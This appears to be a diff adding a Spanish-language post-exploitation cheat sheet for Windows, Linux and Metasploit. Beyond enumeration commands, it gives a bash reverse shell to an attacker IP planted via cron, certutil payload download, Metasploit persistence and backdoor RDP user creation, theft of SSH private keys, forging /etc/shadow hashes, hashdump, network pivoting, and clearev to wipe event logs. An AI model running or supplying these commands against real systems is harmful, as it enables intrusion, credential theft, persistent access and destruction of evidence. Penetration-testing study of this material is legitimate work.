@@ -1,0 +1,144 @@
+*Windows:
+  Obtener los previlegios de un usuario en windows:
+    whoami /priv
+  Obtener los usuarios admin del grupo administradores:
+    net localgroup administrators
+  Obtener SMB Shares:
+    windows/gather/enum_shares
+  Obtener nombre de usuarios logeados y recientes:
+    use post/windows/gather/enum_logged_on_users
+    set SESSION 1
+    run
+  Obtener lista de grupos:
+    net localgroups
+  Obtener informacion sobre un grupo:
+    net localgroup [grupo]
+
+  Obtener lista de usuarios:
+    net users
+
+  Ver enrutamientos:
+    route print
+    arp -a
+    netstat -ano
+    netsh firewall show state
+    netsh advfirewall firewall
+    netsh advfirewall firewall dump
+    netsh advfirewall show allprofiles
+
+  Enumerar actualizaciones HotFix URL:
+    wmic qfe get ,Description,HotFixID,InstalledOn
+
+  Enumerar procesos y servicios:
+    tasklist /SVC
+  Ver servicios corriendo/startup:
+    net start
+  Obtener servicios e informacion:
+    wmic service list brief
+
+  Realizar escaneo automatico de previlegios con exploits posibles:
+    https://github.com/itm4n/PrivescCheck
+
+  Para realizar login a windows ¿con smb?:
+    use windows/smb/psexec
+
+  Persistencia en windows:
+    use exploit/windows/local/persistence_service
+   *Luego*usar*para*reconectar:
+     modulo reverse_tcp para reconectar. multi/handler; set payload
+                                          windows/meterpreter/reverse_tcp
+
+  Crear un usuario en RDP:
+    run getgui -e -u [Nombre: alexis] -p [Contraseña: hk_123321]
+
+  Controlar windows desde RDP:
+    xfreerdp /u:[Usuario] /p:[CONTRASEÑA] /v:[IP]
+
+  Transferir archivo o archivos:
+    certutil -urlcache -f http://[ip]/[path] [output]
+
+*Linux:
+  Obtener los grupos:
+    groups
+  Mostrar primer nombre:
+    cat /etc/resolv.conf
+  Ver lista de procesos de root:
+    ps aux | grep root
+  Enumerar configuracion de linux:
+    post/linux/gather/enum_configs
+  *para*network:
+                     /enum_network
+
+  Usar lo siguiente para enumerar informacion:
+    https://github.com/rebootuser/LinEnum
+
+  Listar shell:
+    cat /etc/shells
+
+  Buscar archivos:
+    find / -not -type l -perm -o+x
+    *Si*/etc/shadow*aparece,*entonces*es*editable
+      openssl passwd -1 -salt abc password
+
+  Descargar archivos desde ssh:
+    scp [usuario]@[ip]:[dir: /home/....../.ssh/id_rsa] .
+
+  No olvidar cron. Entablar shell con bash:
+    /bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PUERTO] 0>&1'
+
+  Ver crontab:
+    crontab -l
+      *Al*editar*el*crontab*usar: * * * * *
+
+
+msfconsole:
+  Obtener el nombre de usuario y grupo, sintaxtis: USUARIO/GRUPO
+    getuid
+
+  MIGRAR UNA SESSION NO METERPRETER A METERPRETER:
+    sessions -u ID
+
+  Obtener informacion basica:
+    sysinfo
+
+  Saber particiones:
+    df -h
+  Ver apt-get instaladas:
+    dpkg -l
+  Ver conecciones:
+    netstat
+  Obtener lista de PIDs y grepearlo:
+    pgrep [proceso: explorer.exe]
+  Ver lista de procesos:
+    ps
+
+  Setear un valor default:
+    setg RHOST [IP VICTIMA]
+  Ver lista de procesos:
+    top
+  Ver contab:
+    crontab -l
+    ls -la /etc/cron*
+    cat /etc/cron*
+  Obtener prigilegios actuales luego de migrar proceso:
+    getprivs
+
+  Ver hashes:
+    hashdump
+
+
+
+
+Pivoting:
+  run autoroute -s 10.0.29.0/20
+  Listar:
+    run autoroute -p
+  Luego usar para descubrir puertos:
+    use scanner/portscan/tcp y setear RHOST a la ip destino (no proxychain).
+  Enlazar puertos:
+    portfwd add -l [PUERTO LOCALHOST] -p [PUERTO DESTINO] -r [IP]
+
+
+Logs:
+  Limpiar evidencias:
+    clearev
